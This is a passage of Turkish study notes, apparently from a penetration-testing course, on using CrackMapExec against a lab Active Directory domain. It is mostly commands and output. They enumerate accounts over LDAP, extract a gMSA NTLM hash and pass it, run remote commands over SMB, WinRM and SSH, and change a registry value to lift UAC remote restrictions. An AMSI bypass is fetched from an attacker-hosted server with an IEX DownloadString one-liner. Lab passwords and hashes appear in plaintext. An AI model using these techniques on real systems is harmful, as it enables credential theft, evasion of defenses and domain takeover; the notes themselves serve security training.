LDAP dc01.inlanefreight.htb 389 DC01 krbtgt
Key Distribution Center Service Account
LDAP dc01.inlanefreight.htb 389 DC01 julio
LDAP dc01.inlanefreight.htb 389 DC01 david
LDAP dc01.inlanefreight.htb 389 DC01 john
User for kiosko IP 172.16.10.9
LDAP dc01.inlanefreight.htb 389 DC01
svc_workstations
LDAP dc01.inlanefreight.htb 389 DC01 carlos
LDAP dc01.inlanefreight.htb 389 DC01 robert
LDAP dc01.inlanefreight.htb 389 DC01 grace
LDAP dc01.inlanefreight.htb 389 DC01 peter
LDAP dc01.inlanefreight.htb 389 DC01 alina
Account for testing HR App. Password: HRApp123!
<SNIP>
LDAP dc01.inlanefreight.htb 389 DC01 Administrators
LDAP dc01.inlanefreight.htb 389 DC01 Users
LDAP dc01.inlanefreight.htb 389 DC01 Guests
LDAP dc01.inlanefreight.htb 389 DC01 Print Operators
LDAP dc01.inlanefreight.htb 389 DC01 Backup
Operators
LDAP dc01.inlanefreight.htb 389 DC01 Replicator
LDAP dc01.inlanefreight.htb 389 DC01 Remote Desktop
Users
LDAP dc01.inlanefreight.htb 389 DC01 Network
Configuration Operators
LDAP dc01.inlanefreight.htb 389 DC01 Performance
Monitor Users
LDAP dc01.inlanefreight.htb 389 DC01 Performance Log
Users
LDAP dc01.inlanefreight.htb 389 DC01 Distributed COM
Users
LDAP dc01.inlanefreight.htb 389 DC01 IIS_IUSRS
LDAP dc01.inlanefreight.htb 389 DC01 Cryptographic
Operators
LDAP dc01.inlanefreight.htb 389 DC01 Event Log
Readers
LDAP dc01.inlanefreight.htb 389 DC01 Certificate
Service DCOM Access
<SNIP>

```

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
password-not-required

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP dc01.inlanefreight.htb 389 DC01 User: Guest
Status: enabled
```

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
trusted-for-delegation

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP dc01.inlanefreight.htb 389 DC01 MS01$
LDAP dc01.inlanefreight.htb 389 DC01 DC01$
```

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
admin-count
SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP dc01.inlanefreight.htb 389 DC01 Administrator
LDAP dc01.inlanefreight.htb 389 DC01 Administrators
LDAP dc01.inlanefreight.htb 389 DC01 Print Operators
LDAP dc01.inlanefreight.htb 389 DC01 Backup
Operators
LDAP dc01.inlanefreight.htb 389 DC01 Replicator
LDAP dc01.inlanefreight.htb 389 DC01 krbtgt
LDAP dc01.inlanefreight.htb 389 DC01 Domain
Controllers
LDAP dc01.inlanefreight.htb 389 DC01 Schema Admins
LDAP dc01.inlanefreight.htb 389 DC01 Enterprise
Admins
LDAP dc01.inlanefreight.htb 389 DC01 Domain Admins
LDAP dc01.inlanefreight.htb 389 DC01 Server
Operators
LDAP dc01.inlanefreight.htb 389 DC01 Account
Operators
LDAP dc01.inlanefreight.htb 389 DC01 Read-only
Domain Controllers
LDAP dc01.inlanefreight.htb 389 DC01 Key Admins
LDAP dc01.inlanefreight.htb 389 DC01 Enterprise Key
Admins
LDAP dc01.inlanefreight.htb 389 DC01 julio
LDAP dc01.inlanefreight.htb 389 DC01 david
LDAP dc01.inlanefreight.htb 389 DC01 john
<SNIP>

```


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
get-sid

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP dc01.inlanefreight.htb 389 DC01 Domain SID S-1-
5-21-3325992272-2815718403-617452758
```


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

```
crackmapexec winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X
"Get-ADServiceAccount -Filter * -Properties
PrincipalsAllowedToRetrieveManagedPassword"

SMB dc01.inlanefreight.htb 5985 DC01 [*] Windows
10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
HTTP dc01.inlanefreight.htb 5985 DC01 [*]
http://dc01.inlanefreight.htb:5985/wsman
WINRM dc01.inlanefreight.htb 5985 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WINRM dc01.inlanefreight.htb 5985 DC01 [+] Executed
command
WINRM dc01.inlanefreight.htb 5985 DC01
DistinguishedName : CN=svc_inlaneadm,CN=Managed
Service Accounts,DC=inlanefreight,DC=htb
Enabled : True
Name : svc_inlaneadm
ObjectClass : msDSGroupManagedServiceAccount
ObjectGUID : 6328a77f-9696-40b4-82b7-
725ac19564b6
PrincipalsAllowedToRetrieveManagedPassword :
{CN=engels,CN=Users,DC=inlanefreight,DC=htb}
SamAccountName : svc_inlaneadm$
SID : S-1-5-21-3325992272-
2815718403-617452758-6123
UserPrincipalName :

```


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

```
crackmapexec ldap dc01.inlanefreight.htb -u engels -p Inlanefreight1998! --gmsa

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 636 DC01 [+]
inlanefreight.htb\engels:Inlanefreight1998!
LDAP dc01.inlanefreight.htb 636 DC01 [*] Getting
GMSA Passwords
LDAP dc01.inlanefreight.htb 636 DC01 Account:
svc_inlaneadm$ NTLM: 76fa2df9e8f656ae81b0bd271bef0346
```

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

```
crackmapexec smb dc01.inlanefreight.htb -u svc_inlaneadm$ -H
76fa2df9e8f656ae81b0bd271bef0346 --shares

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB dc01.inlanefreight.htb 445 DC01 [+]
inlanefreight.htb\svc_inlaneadm$:76fa2df9e8f656ae81b0bd271bef0346
SMB dc01.inlanefreight.htb 445 DC01 [+] Enumerated shares
SMB dc01.inlanefreight.htb 445 DC01 Share Permissions Remark
SMB dc01.inlanefreight.htb 445 DC01 -----
----------- ------
SMB dc01.inlanefreight.htb 445 DC01 ADMIN$ Remote Admin
SMB dc01.inlanefreight.htb 445 DC01 C$ Default share
SMB dc01.inlanefreight.htb 445 DC01 CertEnroll
READ Active Directory Certificate Services share
<SNIP>
```


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

```
crackmapexec rdp 10.129.204.177 --nla-screenshot
RDP 10.129.204.177 3389 DC01 [*] Windows 10 or
Windows Server 2016 Build 17763 (name:DC01) (domain:inlanefreight.htb)
(nla:False)
RDP 10.129.204.177 3389 DC01 NLA Screenshot saved
/home/plaintext/.cme/screenshots/DC01_10.129.204.177_2022-12-19_124833.png
```

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

```
eom /home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11-
23_163607.png
```

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

```
crackmapexec rdp 10.129.204.177 -u julio -p Password1 --screenshot --
screentime 5 --res 1280x720

RDP 10.129.204.177 3389 DC01 [*] Windows 10 or
Windows Server 2016 Build 17763 (name:DC01) (domain:inlanefreight.htb)
(nla:False)
RDP 10.129.204.177 3389 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
RDP 10.129.204.177 3389 DC01 Screenshot saved
/home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11-23_163607.png
```


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

```
eom /home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11- 23_163607.png
```

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

```
crackmapexec smb 10.129.204.133 -u Administrator -p 'AnotherC0mpl3xP4$' -
-local-auth -x "net localgroup administrators"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
MS01\Administrator:AnotherC0mpl3xP4$ (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 Alias name
administrators
SMB 10.129.204.133 445 MS01 Comment
Administrators have complete and unrestricted access to the
computer/domain
SMB 10.129.204.133 445 MS01
SMB 10.129.204.133 445 MS01 Members
SMB 10.129.204.133 445 MS01
SMB 10.129.204.133 445 MS01 ----------------------
---------------------------------------------------------
SMB 10.129.204.133 445 MS01 Administrator
SMB 10.129.204.133 445 MS01 INLANEFREIGHT\david
SMB 10.129.204.133 445 MS01 INLANEFREIGHT\DomainAdmins
SMB 10.129.204.133 445 MS01 INLANEFREIGHT\julio
SMB 10.129.204.133 445 MS01 INLANEFREIGHT\robert
SMB 10.129.204.133 445 MS01 localadmin
SMB 10.129.204.133 445 MS01 The command completed
successfully.
```


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

```
crackmapexec smb 10.129.204.133 -u localadmin -p Password99! --local-auth
-x whoami

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
MS01\localadmin:Password99!
```

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

```
crackmapexec smb 10.129.204.133 -u Administrator -p 'AnotherC0mpl3xP4$' -
-local-auth -x "reg add
HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V
LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
MS01\Administrator:AnotherC0mpl3xP4$ (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 The operation
completed successfully.

```


```
crackmapexec smb 10.129.204.133 -u localadmin -p Password99! --local-auth
-x whoami

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
MS01\localadmin:Password99! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 ms01\localadmin

```


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -x whoami

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 inlanefreight\robert

```


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --execmethod smbexec -x whoami

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
via smbexec
SMB 10.129.204.133 445 MS01 nt authority\system
```

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --execmethod wmiexec -X '$PSVersionTable'

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command via wmiexec
SMB 10.129.204.133 445 MS01 Name Value
SMB 10.129.204.133 445 MS01 ----
-----
SMB 10.129.204.133 445 MS01 PSVersion 5.1.17763.2268
SMB 10.129.204.133 445 MS01 PSEdition  Desktop
SMB 10.129.204.133 445 MS01 PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}
SMB 10.129.204.133 445 MS01 BuildVersion 10.0.17763.2268
SMB 10.129.204.133 445 MS01 CLRVersion 4.0.30319.42000
SMB 10.129.204.133 445 MS01 WSManStackVersion 3.0
SMB 10.129.204.133 445 MS01 PSRemotingProtocolVersion 2.3
SMB 10.129.204.133 445 MS01 SerializationVersion 1.1.0.1

```


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

```
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/s hantanukhande-amsi.ps1 -q
```


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -X
'$PSVersionTable' --amsi-bypass shantanukhande-amsi.ps1

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
[-] Command exceeds maximum length of 8191 chars (was 3065628). exiting.
[*] Shutting down, please wait...
```

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

```
echo "IEX(New-Object
Net.WebClient).DownloadString('http://10.10.14.33/shantanukhandeamsi.ps1');" > amsibypass.txt

sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -X
'$PSVersionTable' --amsi-bypass amsibypass.txt

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 -- AMSI Patch
SMB 10.129.204.133 445 MS01 -- Modified By:
Shantanu Khandelwal (@shantanukhande)
SMB 10.129.204.133 445 MS01 -- Original Author:
Paul LaArnAc (@am0nsec)
SMB 10.129.204.133 445 MS01
SMB 10.129.204.133 445 MS01 [+] 64-bits process
SMB 10.129.204.133 445 MS01 [+] AMSI DLL Handle: 
140724553187328
SMB 10.129.204.133 445 MS01 [+] DllGetClassObject
address: 140724553193616
SMB 10.129.204.133 445 MS01 [+] Targeted address:
140724553200416
SMB 10.129.204.133 445 MS01
SMB 10.129.204.133 445 MS01 Name
Value
SMB 10.129.204.133 445 MS01 ----
-----
SMB 10.129.204.133 445 MS01 PSVersion
5.1.17763.2268
SMB 10.129.204.133 445 MS01 PSEdition Desktop
SMB 10.129.204.133 445 MS01 PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}
SMB 10.129.204.133 445 MS01 BuildVersion 10.0.17763.2268
SMB 10.129.204.133 445 MS01 CLRVersion 4.0.30319.42000
SMB 10.129.204.133 445 MS01 WSManStackVersion 3.0
SMB 10.129.204.133 445 MS01
PSRemotingProtocolVersion 2.3
SMB 10.129.204.133 445 MS01 SerializationVersion 1.1.0.1

```


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

```
crackmapexec winrm 10.129.204.133 -u robert -p 'Inlanefreight01!' -x
whoami

SMB 10.129.204.133 5985 MS01 [*] Windows 10.0 Build
17763 (name:MS01) (domain:inlanefreight.htb)
HTTP 10.129.204.133 5985 MS01 [*]
http://10.129.204.133:5985/wsman
WINRM 10.129.204.133 5985 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WINRM 10.129.204.133 5985 MS01 [+] Executed command
WINRM 10.129.204.133 5985 MS01 inlanefreight\robert

```


### WinRM aracılığıyla PowerShell Komut Yürütme

```
crackmapexec winrm 10.129.204.133 -u robert -p 'Inlanefreight01!' -X
'$PSVersionTable'

SMB 10.129.204.133 5985 MS01 [*] Windows 10.0 Build
17763 (name:MS01) (domain:inlanefreight.htb)
HTTP 10.129.204.133 5985 MS01 [*]
http://10.129.204.133:5985/wsman
WINRM 10.129.204.133 5985 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WINRM 10.129.204.133 5985 MS01 [+] Executed command
WINRM 10.129.204.133 5985 MS01
Name Value
---- -----
PSVersion 5.1.17763.2268
PSEdition Desktop
PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}
BuildVersion 10.0.17763.2268
CLRVersion 4.0.30319.42000
WSManStackVersion 3.0
PSRemotingProtocolVersion 2.3
SerializationVersion  1.1.0.1
```

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

```
crackmapexec ssh 10.129.204.133 -u robert -p 'Inlanefreight01!' -x
ipconfig

SSH 10.129.204.133 22 10.129.204.133 [*] SSH-2.0-
OpenSSH_for_Windows_7.7
SSH 10.129.204.133 22 10.129.204.133 [+]
robert:Inlanefreight01!
SSH 10.129.204.133 22 10.129.204.133 [+] Executed command
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Windows IP
Configuration
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Ethernet adapter
Ethernet1:
SSH 10.129.204.133 22 10.129.204.133
SSH 10.129.204.133 22 10.129.204.133 Connection-specific
DNS Suffix . :
SSH 10.129.204.133 22 10.129.204.133 IPv4 Address. . . . .
. . . . . . : 172.16.1.5
